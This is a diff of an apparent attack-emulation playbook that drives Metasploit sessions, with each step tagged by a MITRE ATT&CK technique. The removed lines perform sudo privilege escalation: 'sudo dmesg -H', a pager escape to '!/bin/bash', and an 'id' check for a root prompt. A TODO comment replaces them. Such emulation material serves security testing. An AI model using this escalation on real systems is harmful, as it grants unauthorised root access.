@@ -155,32 +155,7 @@ commands:
       tactics: "Discovery"
       technique_name: "System Owner/User Discovery"
 
-  - type: msf-session
-    cmd: sudo dmesg -H
-    write: True
-    session: "foothold"
-    metadata:
-      techniques: "T1548.003"
-      tactics: "Privilege Escalation,Defense Evasion"
-      technique_name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
-
-  - type: msf-session
-    cmd: "!/bin/bash"
-    session: "foothold"
-    metadata:
-      techniques: "T1548.003"
-      tactics: "Privilege Escalation,Defense Evasion"
-      technique_name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
-
-  - type: msf-session
-    cmd: id
-    session: "foothold"
-    end_str: "root@videoserver:/tmp#"
-    metadata:
-      techniques: "T1033"
-      tactics: "Discovery"
-      technique_name: "System Owner/User Discovery"
-
+  # TODO implement privilege escalation
 
   - type: msf-session
     session: "foothold"
